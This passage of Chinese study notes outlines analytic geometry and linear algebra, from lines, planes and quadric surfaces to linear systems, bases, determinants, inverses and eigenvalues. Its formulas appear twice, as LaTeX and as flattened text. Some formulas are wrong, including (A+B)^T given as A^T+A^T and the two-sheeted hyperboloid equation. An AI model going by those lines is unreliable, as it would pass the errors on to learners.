z+D_{2}=0\end{array}\right.{A1x+B1y+C1z+D1=0A2x+B2y+C2z+D2=0</li><li>可以看成是两个平面的交线</li></ul><h5 id="直线的对称方程与参数方程">直线的对称方程与参数方程</h5><ul><li>平行向量：如果一个非零向量 s 平行于一条已知直线 L ，这个向量就叫做这直线的方向<br>向量<ul><li>s 的坐标叫做该直线的一组方向数，s 的方向余弦叫做这直线的方向余弦</li></ul></li><li>对称式方程/点向式方程：\frac{x-x_{0}}{m}=\frac{y-y_{0}}{n}=\frac{z-z_{0}}{p}mx−x0=ny−y0=pz−z0，其中参数出自直线 LL 上一点 M(x_0,y_0,z_0)M(x0,y0,z0) 和它的一方向向量 s=(m,n,p)s=(m,n,p)</li><li>参数方程：\left{\begin{array}{l}x=x_{0}+m t \ y=y_{0}+n t \ z=z_{0}+p t\end{array}\right.⎩⎨⎧x=x0+mty=y0+ntz=z0+pt</li></ul><h5 id="两直线的夹角">两直线的夹角</h5><ul><li>设直线的方向向量为 s_1=(m_1,n_1,p_1)s1=(m1,n1,p1) 和 s_2=(m_2,n_2,p_2)s2=(m2,n2,p2) ，那么两直线的夹角公式为：</li></ul><p>\cos \varphi=\frac{\left|m_{1} m_{2}+n_{1} n_{2}+p_{1} p_{2}\right|}{\sqrt{m_{1}^{2}+n_{1}^{2}+p_{1}^{2}} \sqrt{m_{2}^{2}+n_{2}^{2}+p_{2}^{2}}} cosφ=m12+n12+p12m22+n22+p22∣m1m2+n1n2+p1p2∣</p><ul><li>直线与平面的夹角</li><li>设直线的方向为 s = (m,n, p)s=(m,n,p)，平面的法线向量为 n = (A,B,C)n=(A,B,C)，那么两直线的夹角公式为**（注意是 sin）**</li></ul><p>\sin \varphi=\frac{|A m+B n+C p|}{\sqrt{A^{2}+B^{2}+C^{2}} \sqrt{m^{2}+n^{2}+p^{2}}} sinφ=A2+B2+C2m2+n2+p2∣Am+Bn+Cp∣</p><h5 id="两直线的公垂线方程求法：">两直线的公垂线方程求法：</h5><ul><li>由两直线 L_1L1,L_2L2 的方向向量叉乘可得公垂线的方向向量</li><li>由公垂线的方向向量和 L_1L1 的方向向量以及 L_1L1上一点可得过公垂线和 L_1L1 的平面方程 S_1S1;由公垂线的方向向量和 L_2L2 的方向向量以及 L_2L2上一点可得过公垂线和 L_2L2 的平面方程 S_2S2</li><li>S_1S1 和 S_2S2 组成的方程组即是公垂线方程</li></ul><h4 id="平面束方程">平面束方程</h4><ul><li><p>设直线 LL 由方程组</p><p>\left{\begin{array}{l}  A x+B y+C_{1} z+D_{1}=0 \  A_{2} x+B_{2} y+C_{2} z+D_{2}=0 \end{array}\right.{Ax+By+C1z+D1=0A2x+B2y+C2z+D2=0</p></li></ul><p>确定，其中系数 A_{1}, B_{1}, C_{1}A1,B1,C1 与 A_{2}, B_{2}, C_{2}A2,B2,C2 不成比例. 我们建立三元一次方程<br>A_{1} x+B_{1} y+C_{1} z+D_{1}+\lambda\left(A_{2} x+B_{2} y+C_{2} z+D_{2}\right)=0A1​x+B1​y+C1​z+D1​+λ(A2​x+B2​y+C2​z+D2​)=0<br>这就是通过直线 LL 的平面束的方程，<strong>但是不能表示 A_{2} x+B_{2} y+C_{2} z+D_{2}=0A2​x+B2​y+C2​z+D2​=0 这个平面</strong></p><h3 id="曲面">曲面</h3><ul><li>曲面方程：曲面上的点坐标都满足方程，不在曲面上的点坐标都不满足方程</li></ul><h4 id="旋转曲面">旋转曲面</h4><ul><li>旋转曲面：以一条平面曲线绕其平面上的一条直线旋转一周所成的曲面<ul><li>母线：旋转曲线</li><li>轴：定直线</li></ul></li><li>设在 y O zyOz 坐标面上有一已知曲线 CC ，它的方程为:f(y, z)=0f(y,z)=0<br>把这曲线绕 zz 轴旋转一周，就得到一个以 zz 轴为轴的旋转曲面 ，它的方程可以求得如下:<ol><li>设 M_{1}\left(0, y_{1}, z_{1}\right)M1(0,y1,z1) 为曲线 CC 上的任一点则 f\left(y_{1}, z_{1}\right)=0f(y1,z1)=0</li><li>当曲线 CC 绕 zz 轴旋转时, 点 M_{1}M1 绕 zz 轴转到另一点 M(x, y, z),M(x,y,z), 这时 z=z_{1}z=z1 保持不交,且点 MM 到 zz 轴的距离为 d=\sqrt{x^{2}+y^{2}}=\left|y_{1}\right|d=x2+y2=∣y1∣。</li><li>将 z_{1}=z, \quad y_{1}=\pm \sqrt{x^{2}+y^{2}}z1=z,y1=±x2+y2 代入 (3) 式, 有 f\left(\pm \sqrt{x^{2}+y^{2}}, z\right)=0f(±x2+y2,z)=0<br><strong>这就是旋转曲面的方程。</strong></li></ol></li><li>圆锥面：直线 LL 绕另一条与 LL 相交的直线旋转一周，所得旋转曲面<ul><li>顶点：两直线的交点</li><li>半顶角：两直线的夹角 0&lt;\alpha&lt;\frac{\pi}{2}0&lt;α&lt;2π</li></ul></li><li>旋转单叶双曲面：双曲线绕 zz 轴旋转</li><li>旋转双叶双曲面：双曲线绕 xx 轴旋转</li></ul><h4 id="柱面">柱面</h4><ul><li><p>柱面：平行于定直线</p><p>l_0l0</p><p>并沿定曲线</p><p>CC</p><p>移动的直线</p><p>LL</p><p>形成的轨迹</p><ul><li>准线：曲线 CC</li><li>母线：动直线 l_0l0</li><li>一般地，只含 x,yx,y 而缺 zz 的方程 F ( x, y)= 0F(x,y)=0 在空间直角坐标系中表示母线平行于 zz 轴的柱面，其准线是 xOyxOy 面上的曲线C:F(x, y)=0C:F(x,y)=0</li></ul></li></ul><h4 id="二次曲面">二次曲面</h4><ul><li><p>二次曲面：F(x, y,z)=0F(x,y,z)=0 所表示的曲面</p></li><li><p>基本研究方法：截痕法</p></li><li><p>基本类型</p><ol><li><p>椭球面：\frac{x^{2}}{a^{2}}+\frac{y^{2}}{b^{2}}+\frac{z^{2}}{c^{2}}=1 \quad(a, b, c&gt;0)a2x2+b2y2+c2z2=1(a,b,c&gt;0)</p></li><li><p>抛物面</p><ul><li><p>(1) 椭圆拋物面：\frac{x^{2}}{2 p}+\frac{y^{2}}{2 q}=z \quad(p, q&gt;0)2px2+2qy2=z(p,q&gt;0)</p><p>(2) 双曲抛物面 ( 鞍形曲面 )：-\frac{x^{2}}{2 p}+\frac{y^{2}}{2 q}=z\quad(p, q&gt;0)−2px2+2qy2=z(p,q&gt;0)</p></li></ul></li><li><p>双曲面</p><ul><li>单叶双曲面：\frac{x^{2}}{a^{2}}+\frac{y^{2}}{b^{2}}-\frac{z^{2}}{c^{2}}=1 \quad(a, b, c&gt;0)a2x2+b2y2−c2z2=1(a,b,c&gt;0)</li><li>双叶双曲面：\frac{x^{2}}{a^{2}}+\frac{y^{2}}{b^{2}}+\frac{z^{2}}{c^{2}}=-1 \quad(a, b, c&gt;0)a2x2+b2y2+c2z2=−1(a,b,c&gt;0)</li></ul></li><li><p>椭圆锥面：\frac{x^{2}}{a^{2}}+\frac{y^{2}}{b^{2}}=z^2 \quad(a, b&gt;0)a2x2+b2y2=z2(a,b&gt;0)</p></li></ol></li></ul><h3 id="曲线">曲线</h3><h4 id="空间曲线的一般方程">空间曲线的一般方程</h4><ul><li>空间曲线可视为两曲面的交线，其一般方程为方程组 \left{\begin {array} {l}F(x,y,z)=0\G(x,y,z)=0 \end{array}\right.{F(x,y,z)=0G(x,y,z)=0</li></ul><h4 id="空间曲线的参数方程">空间曲线的参数方程</h4><ul><li>将曲线 CC 上的动点坐标 x, y, zx,y,z 表示成参数 tt 的函数：\left{\begin{array}{l}x=x(t)\y=y(t)\z=z(t) \end{array}\right.⎩⎨⎧x=x(t)y=y(t)z=z(t)<br>称它为空间曲线的参数方程.</li></ul><h4 id="空间曲线在坐标面上的投影">空间曲线在坐标面上的投影</h4><ul><li><p>以曲线 CC 为准线、母线平行于 zz 轴(即垂直于 xOyxOy面)的柱面叫做曲线CC 关于 xOyxOy 面的<strong>投影柱面</strong>；投影柱面与 xOyxOy 面的交线叫做空间曲线 CC 在 xOyxOy 面上的投影曲线, 简称<strong>投影</strong></p></li><li><p>方法：</p><p>\left{\begin{array}{l}  F(x, y, z)=0 \  G(x, y, z)=0 \end{array}\right.{F(x,y,z)=0G(x,y,z)=0</p></li></ul><p>消去变量 zz 后所得的方程</p><p>H(x, y)=0 H(x,y)=0</p><p>则在 xOyxOy 面上的投影是： \left{\begin {array} {l}H(x,y)=0\z=0 \end{array}\right.{H(x,y)=0z=0</p><h2 id="线性方程组的解法">线性方程组的解法</h2><ul><li>行向量、列向量<ul><li>内积<ul><li>正交</li></ul></li></ul></li><li>矩阵的引入<ul><li>线性方程组<ul><li>矩阵：系数</li><li>增广矩阵：系数+常数项</li></ul></li><li>矩阵：A=A_{m\times n}=(a_{ij})<em>{m\times n}=(a</em>{ij})A=Am×n=(aij)m×n=(aij)<ul><li>元：a_{ij}aij<ul><li>元为实（复）数——实（复）矩阵</li></ul></li><li>主对角线、副对角线</li><li>特殊矩阵<ul><li>方阵：m=nm=n</li><li>行矩阵、列矩阵</li><li>对角矩阵：仅主对角线元不为 0，记作 diag(\lambda_1,\lambda_2,\dots,\lambda_n)diag(λ1,λ2,…,λn)</li><li>零矩阵</li><li>单位矩阵</li><li>同型矩阵：两矩阵行列数相等<ul><li>相等=同型矩阵+所有元相等</li></ul></li></ul></li></ul></li></ul></li><li>矩阵解线性方程组<ul><li>LS 公式：将 AXAX 变换为矩阵之积</li></ul></li><li>矩阵的行变换<ol><li>互换两行 r_i\leftrightarrow r_jri↔rj</li><li>以 k\neq0k=0 乘以某一行所有元素 r_i*kri∗k</li><li>把某一个行的 kk 倍加到另一行上 r_i+kr_jri+krj</li></ol></li><li>等价 \sim∼：反身性、对称性、传递性<ul><li>有限初等行变换所得矩阵等价</li></ul></li><li>LS 消元法<ol><li>由线性方程组得到增广矩阵</li><li>增广矩阵经过初等行变换变成最简阶梯形矩阵</li><li>最简阶梯形矩阵可变换为标准形，从而得到解或通解（解空间）</li></ol></li></ul><h3 id="方程有解问题">方程有解问题</h3><ul><li><p>通过 LS 消元法可以获得最简阶梯形矩阵，假设未知数个数为 nn，方程个数为 mm，<strong>最后 m-rm−r 行为 0，即总共 rr 行不为 0</strong>，剩下的方程个数为 s(s\geq r)s(s≥r);</p><ul><li><p>s&gt;rs&gt;r：有矛盾方程，无解</p></li><li><p>s=rs=r</p><p>：有解</p><ul><li><p>r=nr=n，具有唯一解</p></li><li><p>r&lt;nr&lt;n</p><p>，有</p><p>rr</p><p>个非独立未知元，</p><p>n-rn−r</p><p>个独立未知元（自由参数）</p><ul><li>解的表示：将非独立未知元用<strong>独立未知元表示</strong></li></ul></li></ul></li></ul></li><li><p>齐次定理：若未知元个数 nn 大于方程个数 mm, 则齐次组 AX=0AX=0 有非零解（有无穷多）。即， 若 n &gt; mn&gt;m, 则 AX=0AX=0 必有非零解。</p></li></ul><h3 id="数域">数域</h3><ul><li>数域：PP 是复数集，且对加减乘除封闭<ul><li>有理数域是最小的数域，被所有数域包含</li></ul></li><li>数环：PP 是复数集，且对加减乘封闭</li><li>更多抽代的内容可以在这里找到：<a href="https://justloseit.top/%E8%BF%91%E4%B8%96%E4%BB%A3%E6%95%B0%E5%A4%A7%E7%BA%B2/">近世代数大纲</a></li></ul><h2 id="向量空间">向量空间</h2><ul><li>矩阵的加法：对应元相加</li><li>矩阵的数乘：<strong>每一元</strong>都乘以系数</li><li>矩阵的转置：a_{ij} \leftrightarrow a_{ji}aij↔aji</li></ul><h3 id="线性相关与线性无关">线性相关与线性无关</h3><ul><li><p>线性相关：对 F^nFn 中 kk 个向量 a_1,\dots,a_k\in F^na1,…,ak∈Fn，如果<strong>存在</strong>不全为 0 的数 x_1,\dots,x_kx1,…,xk 满足条件 x_1a_1+\dots+x_ka_k=0x1a1+⋯+xkak=0，就称 \left{a_1,\dots,a_k\right}{a1,…,ak} 线性相关。</p></li><li><p>如果不是线性相关，就是线性不相关</p></li><li><p>线性相关等价于：其中某个向量可以表示为<strong>其余向量的线性组合</strong></p></li><li><p>单边法则：设</p><p>a_1,\dots,a_k(a_1\neq0)a1,…,ak(a1=0)</p><ul><li>如果每个 a_jaj 都不被它前面的向量线性组合表示，那么 \left{a_1,\dots,a_k\right}{a1,…,ak} 线性无关</li><li>\left{a_1,\dots,a_k\right}{a1,…,ak} 线性相关，则必存在 j\leq nj≤n 使 a_jaj 能够被之前的向量线性组合表示</li></ul></li><li><p>多一法则：若 \left{a_1,\dots,a_n\right}{a1,…,an} 线性无关，\left { a_1,\dots,a_n,b\right}{a1,…,an,b} 线性相关，则 bb 可以用 a_1\dots,a_na1…,an 表示</p></li><li><p>长短法则：长相关则短相关；短无关则长无关</p><ul><li>这里的长短是各个向量<strong>维数的扩充</strong></li></ul></li><li><p>大数法则：若 pp 个向量 \left{a_1,\dots,a_p\right}{a1,…,ap} 可由 tt 个向量 \left{b_1,\dots,b_t\right}{b1,…,bt} 表示，且 p &gt; tp&gt;t , 则 \left{a_1,\dots,a_p\right}{a1,…,ap} 必线性相关</p></li></ul><h4 id="通过解方程组判断线性相关">通过解方程组判断线性相关</h4><ul><li>向量 a_1,\dots,a_na1,…,an 线性相关的充分必要条件是，方程 x_1a_1+\cdots+x_na_n=0x1a1+⋯+xnan=0 <strong>有非零解</strong></li><li>向量 a_1,\dots,a_na1,…,an 线性无关的充分必要条件是，方程 x_1a_1+\cdots+x_na_n=0x1a1+⋯+xnan=0 <strong>有唯一解 (0,\dots,0)(0,…,0)</strong></li></ul><h3 id="基">基</h3><ul><li><p>基：如果</p><p>TT</p><p>是</p><p>F^nFn</p><p>的一个向量组</p><p>\left{a_1,a_2,\dots,a_n\right}{a1,a2,…,an}</p><p>，能够通过</p><p>唯一</p><p>线性组合</p><p>\sum x_ia_i=b∑xiai=b</p><p>表示</p><p>F^NFN</p><p>中的任何一个向量，就称</p><p>TT</p><p>是</p><p>F_nFn</p><p>的一组基</p><ul><li><strong>基是对于空间而言的</strong></li><li>坐标：线性组合系数 (x_1,x_2,\dots,x_n)(x1,x2,…,xn)</li><li>自然基：\left{e_1,e_2,\dots,e_n\right}{e1,e2,…,en}</li><li>判定定理：F^nFn 中的向量组 SS 是基 \iff⟺ 中有 nn 个线性无关向量</li></ul></li></ul><h4 id="判定线性方程组唯一解">判定线性方程组唯一解</h4><ul><li><p>方程</p><p>AX=bAX=b</p><p>有唯一解</p><p>\iff⟺</p><p>方程</p><p>AX=0AX=0</p><p>有唯一解</p><ul><li>此时 AA 的列向量组构成一组基</li></ul></li></ul><h3 id="基变换与坐标变化变换">基变换与坐标变化变换</h3><ul><li><p>基变换公式：设向量组 \boldsymbol{\alpha}<em>{1}, \boldsymbol{\alpha}</em>{2}, \ldots, \boldsymbol{\alpha}<em>{n}<strong>α</strong>1,<strong>α</strong>2,…,<strong>α</strong>n 和 \boldsymbol{\beta}</em>{1}, \boldsymbol{\beta}<em>{2}, \ldots, \boldsymbol{\beta}</em>{n}<strong>β</strong>1,<strong>β</strong>2,…,<strong>β</strong>n 是 nn 维向量空间 VV 的两个基，若它们之间的关系可表示为</p><p>\left(\beta_{1}, \beta_{2}, \ldots, \beta_{n}\right)=\left(\alpha_{1}, \alpha_{2}, \ldots, \alpha_{n}\right) C (β1,β2,…,βn)=(α1,α2,…,αn)C</p><p>其中 \boldsymbol{C}=\left(c_{i j}\right)<em>{m \times n}<strong>C</strong>=(cij)m×n， 则称矩阵 \boldsymbol{C}<strong>C</strong> 为从基 \boldsymbol{\alpha}</em>{1}, \boldsymbol{\alpha}<em>{2}, \ldots, \boldsymbol{\alpha}</em>{n}<strong>α</strong>1,<strong>α</strong>2,…,<strong>α</strong>n 到基 \boldsymbol{\beta}<em>{1}, \boldsymbol{\beta}</em>{2}, \ldots, \boldsymbol{\beta}_{n}<strong>β</strong>1,<strong>β</strong>2,…,<strong>β</strong>n 的过渡矩阵。此式为基变换公式。</p></li><li><p>坐标变换公式：设向量组 \boldsymbol{\alpha}<em>{1}, \boldsymbol{\alpha}</em>{2}, \ldots, \boldsymbol{\alpha}<em>{n}<strong>α</strong>1,<strong>α</strong>2,…,<strong>α</strong>n 和 \boldsymbol{\beta}</em>{1}, \boldsymbol{\beta}<em>{2}, \ldots, \boldsymbol{\beta}</em>{n}<strong>β</strong>1,<strong>β</strong>2,…,<strong>β</strong>n 是 nn 维向量空间 VV 的两个基，由 \boldsymbol{\alpha}<em>{1}, \boldsymbol{\alpha}</em>{2}, \ldots, \boldsymbol{\alpha}<em>{n}<strong>α</strong>1,<strong>α</strong>2,…,<strong>α</strong>n 到 \boldsymbol{\beta}</em>{1}, \boldsymbol{\beta}<em>{2}, \ldots, \boldsymbol{\beta}</em>{n}<strong>β</strong>1,<strong>β</strong>2,…,<strong>β</strong>n 的过渡矩阵为 CC，若 VV 中的任意元素在这两组基下的坐标为 (x_1,x_2,\dots,x_n)^T(x1,x2,…,xn)T 和 (y_1,y_2,\dots,y_n)^T(y1,y2,…,yn)T ，则</p><p>\left(x_{1}, x_{2}, \ldots, x_{n}\right)^T=C\left(y_{1}, y_{2}, \ldots, y_{n}\right)^T (x1,x2,…,xn)T=C(y1,y2,…,yn)T</p><ul><li><strong>1 号基到 2 号基的过渡矩阵就是 2 号基到 1 号基的坐标阵</strong>（重在理解，不要死记硬背）</li></ul></li></ul><h3 id="极大线性无关组">极大线性无关组</h3><ul><li><p>设向量组 SS 中 PP 个向量 \left{\boldsymbol{\alpha}<em>{1}, \boldsymbol{\alpha}</em>{2}, \ldots, \boldsymbol{\alpha}_{p}\right}{<strong>α</strong>1,<strong>α</strong>2,…,<strong>α</strong>p} 满足条件：</p><ol><li>\left{\boldsymbol{\alpha}<em>{1}, \boldsymbol{\alpha}</em>{2}, \ldots, \boldsymbol{\alpha}_{n}\right}{<strong>α</strong>1,<strong>α</strong>2,…,<strong>α</strong>n} 线性无关</li><li>\forall \boldsymbol{\beta}\in S, \left{\boldsymbol{\alpha}<em>{1}, \boldsymbol{\alpha}</em>{2}, \ldots, \boldsymbol{\alpha}_{p},\boldsymbol{\beta}\right}∀<strong>β</strong>∈S,{<strong>α</strong>1,<strong>α</strong>2,…,<strong>α</strong>p,<strong>β</strong>} 线性相关</li></ol><p>则称 \left{\boldsymbol{\alpha}<em>{1}, \boldsymbol{\alpha}</em>{2}, \ldots, \boldsymbol{\alpha}_{p}\right}{<strong>α</strong>1,<strong>α</strong>2,…,<strong>α</strong>p} 是 SS 中的一个极大无关组</p><ul><li>pp 叫做 SS 的秩 Rank</li><li><strong>极大线性无关组是对于向量组而言的</strong></li></ul></li><li><p>性质</p><ol><li>大组 SS 中的任一向量都可以由极大组唯一表示（多 1 法则）</li><li>两个极大无关组可以相互表示</li><li>任意两个极大组含有相同的向量个数</li><li>AA 中向量可以被 BB 中向量表示，则 rank A\leq rankBrankA≤rankB</li></ol></li><li><p>同解定理：对方程组 AX=bAX=b 经过行变换得到 BX=dBX=d，则两者同解，而且 \boldsymbol{\alpha}<em>{1}, \boldsymbol{\alpha}</em>{2}, \ldots, \boldsymbol{\alpha}<em>{n}<strong>α</strong>1,<strong>α</strong>2,…,<strong>α</strong>n 和 \boldsymbol{\beta}</em>{1}, \boldsymbol{\beta}<em>{2}, \ldots, \boldsymbol{\beta}</em>{n}<strong>β</strong>1,<strong>β</strong>2,…,<strong>β</strong>n 中<strong>极大组的位置是一一对应的</strong></p><ul><li><strong>行变不改变相关性和无关性</strong></li></ul></li><li><p>向量组秩/极大线性无关组的求法：初等行变换</p></li><li><p>nn 维空间 VV 中的任意线性无关子集 SS 可以扩充为 VV 的基：设 BB 是 VV 的一组基，求出 S\cup BS∪B 的极大线性无关组即可</p></li></ul><h3 id="子空间">子空间</h3><ul><li>设 VV 是数域 FF 上的向量空间，VV 的非空子集 WW 如果满足 WW <strong>对加法和数乘封闭</strong>，就称 WW 是 F^nFn 的子空间<ul><li>子空间的线性无关向量的最大个数是 WW 的维数，记作 \dim WdimW</li></ul></li><li>子集生成的子空间：由数域 FF 上向量空间 VV 的子集 SS 的<strong>全体线性组合</strong>产生的子空间，记为 L(S)L(S)<ul><li>\dim L(S) =rank SdimL(S)=rankS</li></ul></li><li>解空间：<strong>齐次</strong>线性方程组 AX=0AX=0 的解集<ul><li>\dim V_A=n-rankAdimVA=n−rankA，即通解中可以自由取值的未知数个数</li><li>解空间的一组基称为这个方程的一个<strong>基础解系</strong></li></ul></li><li><strong>非齐次线性方程组 AX=bAX=b 有解</strong>：rankA=rank(A,b)rankA=rank(A,b)<ul><li>此时的解为：AX=bAX=b 的一个解 X_1X1 和 AX=0AX=0 的解空间</li></ul></li></ul><h3 id="子空间的交与和">子空间的交与和</h3><ul><li>子空间的交：对于方程组的解空间而言，可以理解为方程<strong>组</strong>联立再求解空间<ul><li>子空间的交仍然是子空间</li></ul></li><li>子空间的和：W_1+W_2=\left{w_1,+w_2|w_1\in W_1,w_2\in W_2\right}W1+W2={w1,+w2∣w1∈W1,w2∈W2}<ul><li>可以理解为求 W_1W1 和 W_2W2 的<strong>基的集合</strong>的基</li><li>\dim(W_1+W_2)=\dim W_1+\dim W_2-\dim(W_1\cap W_2)dim(W1+W2)=dimW1+dimW2−dim(W1∩W2)</li></ul></li><li>下列命题等价：<ol><li>W_1\cap W_2=\left{0\right}W1∩W2={0}</li><li>\dim(W_1+W_2)=\dim W_1+\dim W_2dim(W1+W2)=dimW1+dimW2</li><li>每个 w=w_1+w_2w=w1+w2 由 ww 唯一确定</li><li>w_1+w_2=0w1+w2=0 等价于 w_1=w_2=0w1=w2=0<br>满足命题的 W_1+W_2W1​+W2​ 称为直和，记作 W_1\oplus W_2W1​⊕W2​</li></ol></li></ul><h2 id="行列式">行列式</h2><ul><li>det(A)=|A|=\left|\begin{array}{llll}a_{11} &amp; a_{12} &amp; \cdots &amp; a_{1 n} \ a_{21} &amp; a_{22} &amp; \cdots &amp; a_{2 n} \ \cdots  &amp; \cdots &amp; \cdots &amp; \cdots \ a_{n 1} &amp; a_{n 2} &amp; \cdots &amp; a_{n n}\end{array}\right|det(A)=∣A∣=∣∣∣∣∣∣∣∣a11a21⋯an1a12a22⋯an2⋯⋯⋯⋯a1na2n⋯ann∣∣∣∣∣∣∣∣<br>=\sum(-1)^{t\left(p_{1} p_{2} \cdots p_{n}\right)} a_{p_{1} 1} a_{p_{2} 2} \cdots a_{p_{n} n}=∑(−1)t(p1​p2​⋯pn​)ap1​1​ap2​2​⋯apn​n​</li><li>三角公式：\left|\begin{array}{cccc}a_{11} &amp; a_{12} &amp; \cdots &amp; a_{1 n} \ 0 &amp; a_{22} &amp; \cdots &amp; a_{2 n} \  \cdots &amp; \cdots &amp; \cdots \ 0 &amp; 0 &amp; \cdots &amp; a_{n n}\end{array}\right|=a_{11} a_{22} \cdots a_{n n}∣∣∣∣∣∣∣∣a110⋯0a12a22⋯0⋯⋯⋯⋯a1na2nann∣∣∣∣∣∣∣∣=a11a22⋯ann</li><li>行列式的性质<ul><li>|A^T|=|A|∣AT∣=∣A∣</li><li>如果用同一个数 k 乘行列式中一<strong>行/列</strong>的各元素，等于用 k 乘这个 <strong>行列式</strong></li><li>如果行列式中一行/列的所有元素全为 0，则行列式为 0</li><li>如果两行（列）互换，那么行列式变号</li><li>分项公式</li><li>倍加公式：行列式值不变</li></ul></li><li>Vandermonde 行列式</li></ul><h2 id="矩阵的代数运算">矩阵的代数运算</h2><h3 id="矩阵运算的定义与运算律">矩阵运算的定义与运算律</h3><h4 id="矩阵运算的定义">矩阵运算的定义</h4><ul><li>线性运算<ul><li>加法：行数、列数相等</li><li>数乘：<strong>每个元</strong>都需要乘常数</li></ul></li><li>乘法 ABAB：<strong>AA 的列数和 BB 的行数相等</strong><ul><li>第 (i,j)(i,j) 元等于 AA 的第 ii 行与 B 的第 jj 列之积</li><li>不满足交换律、消去律</li></ul></li><li>零矩阵 OO：所有元素都为 0，相当于 0</li><li>分块矩阵：把矩阵中的元素划分为一个个块，把块当成矩阵的元素<ul><li>分块矩阵的初等变换<ul><li><strong>行变换时，左乘系数矩阵；列变换时，右乘系数矩阵</strong></li></ul></li></ul></li><li>迹：一个n×n矩阵A的主对角线上各个元素的总和，记作 tr(A)tr(A)l</li></ul><h4 id="乘法矩阵运算律">乘法矩阵运算律</h4><ul><li>单位矩阵 II：相当于 1</li><li>对加法的分配律，对数乘的结合律</li><li>乘法结合律<ul><li>错位结合</li></ul></li></ul><h4 id="转置和共轭">转置和共轭</h4><ul><li>转置：A^TAT 的第 (i,j)(i,j) 元 相当于 AA 的第 (j,i)(j,i) 元<ul><li>性质：<ul><li>(A^T)^T=A(AT)T=A</li><li>(A+B)^T=A^T+A^T(A+B)T=AT+AT</li><li>(AB)^T=B^TA^T(AB)T=BTAT</li></ul></li><li>对称：<ul><li>对称方阵：A^T=AAT=A</li><li>反对称方阵：A^T=-AAT=−A</li></ul></li></ul></li><li>共轭 \bar AAˉ：矩阵的每个元换成它的共轭复数</li><li>A^HAH（另一种表达是 A^*A∗，但是<strong>和伴随矩阵不一样</strong>）：{\bar A}^TAˉT<ul><li>A^H=AAH=A：埃尔米特方阵</li><li>A^H=-AAH=−A：斜埃尔米特方阵</li></ul></li></ul><h3 id="逆矩阵">逆矩阵</h3><ul><li><p>矩阵的逆</p><p>A^{-1}A−1</p><p>：</p><p>A^{-1}A=AA^{-1}=IA−1A=AA−1=I</p><ul><li><p>判定：AA 可逆 \Leftrightarrow⇔ |A|\neq 0∣A∣=0</p></li><li><p>性质</p><ul><li>{A^{-1}}^{-1}=AA−1−1=A</li><li>(AB)^{-1}=B^{-1}A^{-1}(AB)−1=B−1A−1</li><li>(A^T)^{-1}=(A^{-1})^T(AT)−1=(A−1)T</li></ul></li><li><p>算法</p><ul><li><p>求矩阵</p><p>AX=BAX=B</p><p>的解</p><ul><li>求矩阵 XA=BXA=B 的解时，可以先两边<strong>转置</strong></li></ul></li><li><p>求逆公式：A^{-1}=|A|^{-1}A^*A−1=∣A∣−1A∗</p></li></ul></li></ul></li></ul><h3 id="余子式与代数余子式">余子式与代数余子式</h3><ul><li>余子式：把元素 a_{ij}aij 所在的第 ii 行和第 jj 列划去后，留下来的阶行列式叫做元素 a_{ij}aij 的余子式，记作 M_{ij}Mij</li><li>代数余子式：A_{ij}=(-1)^{i+j}M_{ij}Aij=(−1)i+jMij</li><li>展开公式：行列式等于它的任一行（列）的元素与其对应的<strong>代数余子式</strong>乘积之和D=a_{i1}A_{i1}+a_{i2}A_{i2}+\dots+a_{in}A_{in} (i = 1,2,\dots,n)D=ai1Ai1+ai2Ai2+⋯+ainAin(i=1,2,…,n)<ul><li>错位公式：0=a_{i1}A_{j1}+a_{i2}A_{j2}+\dots+a_{in}A_{jn} (i = 1,2,\dots,n)0=ai1Aj1+ai2Aj2+⋯+ainAjn(i=1,2,…,n)</li></ul></li><li>伴随矩阵 A^*A∗：第 (i,j)(i,j) 元是 A_{ij}Aij<ul><li>A^*A=|A|IA∗A=∣A∣I</li></ul></li></ul><h3 id="线性映射">线性映射</h3><ul><li><p>分解公式：\boldsymbol{\alpha}=a_1\varepsilon_1+\dots+a_n\varepsilon_n<strong>α</strong>=a1ε1+⋯+anεn，其中 \varepsilon_iεi 是基</p></li><li><p>线性映射：</p><p>WW</p><p>为一个空间，且</p><p>\varphi:W\rightarrow R^{n}φ:W→Rn</p><p>为一个映射，若：</p><ol><li>\varphi(\alpha+\beta)=\varphi(\alpha)+\varphi(\beta)φ(α+β)=φ(α)+φ(β)</li><li>\varphi(k \alpha)=k \varphi(\alpha)φ(kα)=kφ(α)<br>称 \varphiφ 为 WW 到 R^{n}Rn 的一个线性映射</li></ol></li><li><p>线性映射的性质</p><ol><li>\varphi(0)=0φ(0)=0</li><li>若像无关，则原像也无关；若原像相关，则像相关</li></ol></li></ul><h2 id="矩阵的相合与相似">矩阵的相合与相似</h2><h3 id="多项式分解定理">多项式分解定理</h3><ul><li><p>一元多项式主要结论 分解定理: 任一个 nn 次多项式 f(x)f(x)</p><p>f(x)=x^{\mathrm{n}}+c_{n-1} x^{\mathrm{n}-1}+\cdots+c_{1} x+c_{0} f(x)=xn+cn−1xn−1+⋯+c1x+c0</p><p>在<strong>复数域</strong>必有分解式：f(x)=\left(x-\lambda_{1}\right)\left(x-\lambda_{2}\right) \cdots\left(x-\lambda_{n}\right)f(x)=(x−λ1)(x−λ2)⋯(x−λn)<br>数 \lambda_{1}, \lambda_{2} \cdots, \lambda_{n}λ1​,λ2​⋯,λn​ 叫 f(x)f(x) 的 nn 个根(含重复根)</p><ul><li><p>对比系数，可得韦达定理：</p><p>\lambda_{1}+\lambda_{2}+\cdots+\lambda_{n}=-c_{n-1}λ1+λ2+⋯+λn=−cn−1<br>\lambda_{1} \lambda_{2} \cdots \lambda_{n}=(-1)^{n} c_{0}λ1​λ2​⋯λn​=(−1)nc0​</p></li></ul></li></ul><h3 id="特征值与特征向量">特征值与特征向量</h3><ul><li><p>定义: AA 是 nn 阶方阵，若有数 \lambda_{1}λ1 和**非 0 **向量 XX 使 AX=\lambda_{1}XAX=λ1X，称 \lambda_{1}λ1 为 AA 的特征值。 XX 称为 AA 的属于特征值 \lambda_{1}λ1 的特征向量</p><ul><li>AA 的特征值 \lambda_{1}λ1 就是齐次方程组 \left(A-\lambda_{1} I\right) X=0(A−λ1I)X=0 有非 0 解的 \lambda_{1}λ1 值，即 |A-\lambda I|=0∣A−λI∣=0的解</li><li>|\lambda I-A|∣λI−A∣ 叫 AA 的特征式；<br>|\lambda I-A|=0∣λI−A∣=0 叫 AA 的<strong>特征方程</strong>;<br>|\lambda I-A|=0∣λI−A∣=0 的根叫 AA 的特征值（特征根）</li><li>特征向量<strong>线性无关</strong></li></ul></li><li><p>nn 阶阵 AA 的特征根与特向量求法：</p><ol><li>解特征方程 |A-\lambda I|=\mathbf{0},∣A−λI∣=<strong>0</strong>, 求出 nn 个特征值 